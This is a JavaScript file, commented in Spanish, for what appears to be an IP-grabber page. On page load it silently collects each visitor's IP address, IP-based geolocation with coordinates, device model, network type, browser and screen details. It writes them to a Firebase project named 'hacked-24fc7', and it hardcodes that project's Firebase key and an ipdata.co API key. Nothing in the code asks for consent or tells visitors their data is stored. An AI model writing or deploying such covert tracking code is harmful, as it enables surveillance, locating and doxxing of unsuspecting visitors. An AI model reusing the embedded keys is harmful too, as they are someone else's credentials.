// Importar las funciones necesarias del SDK de Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

// Configuración de Firebase de tu aplicación web
const firebaseConfig = {
    apiKey: "AIzaSyCwjHNrFGGjrkCHGQIS3LSoXJb-4enaG5E",
    authDomain: "hacked-24fc7.firebaseapp.com",
    projectId: "hacked-24fc7",
    storageBucket: "hacked-24fc7.appspot.com",
    messagingSenderId: "773649208760",
    appId: "1:773649208760:web:14f7562c8a36317442ab4d"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Función para escribir datos del usuario en Firebase
function escribirDatosUsuario(ip, informacionDispositivo, informacionRed, geolocalizacion, informacionExtra) {
    set(ref(db, 'usuarios/' + Date.now()), {
        ip: ip,
        dispositivo: informacionDispositivo,
        red: informacionRed,
        ubicacion: geolocalizacion,
        extra: informacionExtra
    });
}

// Función para obtener la dirección IP del usuario
function obtenerDireccionIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error obteniendo IP:', error);
            return 'Desconocido';
        });
}

// Función para obtener información de red usando la API de Network Information
function obtenerInformacionRed() {
    let informacionRed = {
        tipo: "Desconocido",
        tipoEfectivo: "Desconocido",
        bajada: "Desconocido",
        rtt: "Desconocido"
    };

    if ('connection' in navigator) {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        informacionRed = {
            tipo: connection.type || "Desconocido",
            tipoEfectivo: connection.effectiveType || "Desconocido",
            bajada: connection.downlink || "Desconocido",
            rtt: connection.rtt || "Desconocido"
        };
    }

    return informacionRed;
}

// Función para obtener geolocalización del usuario usando ipdata.co
function obtenerGeolocalizacion(ip) {
    return fetch(`https://api.ipdata.co/${ip}?api-key=d98d1a60d0572bd6685e1fa4a0ff9e3b7cd7b1dad47ccfa21c4016b1`)
        .then(response => response.json())
        .then(geoData => ({
            ciudad: geoData.city,
            region: geoData.region,
            pais: geoData.country_name,
            latitud: geoData.latitude,
            longitud: geoData.longitude
        }))
        .catch(error => {
            console.error('Error obteniendo geolocalización:', error);
            return {
                ciudad: 'Desconocido',
                region: 'Desconocido',
                pais: 'Desconocido',
                latitud: 'Desconocido',
                longitud: 'Desconocido'
            };
        });
}

// Función para obtener información extra del usuario
function obtenerInformacionExtra() {
    return {
        navegador: navigator.userAgent,
        plataforma: navigator.platform,
        idioma: navigator.language,
        pantalla: {
            ancho: screen.width,
            alto: screen.height,
            profundidadColor: screen.colorDepth
        }
    };
}

// Función para obtener el modelo del dispositivo usando platform.js
function obtenerModeloDispositivo() {
    return platform.product || 'Desconocido';
}

// Función principal para obtener datos del usuario y escribir en Firebase
async function obtenerYEnviarDatosUsuario() {
    try {
        const ip = await obtenerDireccionIP();
        const informacionDispositivo = platform.description;
        const informacionRed = obtenerInformacionRed();
        const geolocalizacion = await obtenerGeolocalizacion(ip);
        const informacionExtra = obtenerInformacionExtra();
        const modeloDispositivo = obtenerModeloDispositivo();

        // Mostrar la dirección IP en pantalla
        document.getElementById('ipDisplay').textContent = `Tu IP: ${ip}`;

        // Escribir los datos en Firebase
        escribirDatosUsuario(ip, informacionDispositivo, informacionRed, geolocalizacion, {
            ...informacionExtra,
            modeloDispositivo: modeloDispositivo
        });
    } catch (error) {
        console.error('Error obteniendo y enviando datos del usuario:', error);
    }
}

// Ejecutar la función principal al cargar la página
document.addEventListener('DOMContentLoaded', obtenerYEnviarDatosUsuario);
